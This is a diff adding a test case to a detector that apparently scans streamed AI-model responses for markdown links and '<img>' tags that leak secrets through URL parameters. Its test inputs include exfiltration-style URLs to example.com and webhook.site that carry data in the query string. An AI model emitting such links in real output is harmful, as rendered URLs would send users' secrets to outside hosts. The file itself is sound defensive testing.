@@ -74,6 +74,23 @@ describe('ExfilStreamHold', () => {
     expect(run(['[r]: https://example.com/docs\n'])).not.toBeNull()
   })
 
+  // Markdown destinations may hold balanced parentheses, backslash-escaped
+  // ones, and (between < >) spaces. The URL judged must be the one a renderer
+  // fetches, whole: this predicate flags only a full path with the secret.
+  it('holds and judges a destination with parentheses, escapes or spaces whole', () => {
+    const bySecret = (text: string) => scanResponseExfil(text, (_h, p) => p.includes('secret')).length > 0
+    const cut = (texts: string[]) => {
+      const hold = new ExfilStreamHold(bySecret)
+      for (const t of texts) if (hold.push(anthropic(t)) === null) return true
+      return hold.end() === null
+    }
+    expect(cut(['[x](https://example.com/a(b)', 'c?d=secret)'])).toBe(true)
+    expect(cut(['[x](https://example.com/a\\)', 'b?d=secret)'])).toBe(true)
+    expect(cut(['[r]: <https://example.com/a b', '?d=secret>\n'])).toBe(true)
+    expect(cut(['[x](<https://example.com/a b?d=secret>)'])).toBe(true)
+    expect(cut(['[x](https://example.com/a(b)c?d=fine) and more'])).toBe(false)
+  })
+
   it('does not close an <img at a > inside a quoted attribute', () => {
     expect(run(['<img alt=">" src="https://webhook.site/?d=1">'])).toBeNull()
     expect(run(["<img alt='>' ", "src='https://webhook.site/?d=1'>"])).toBeNull()
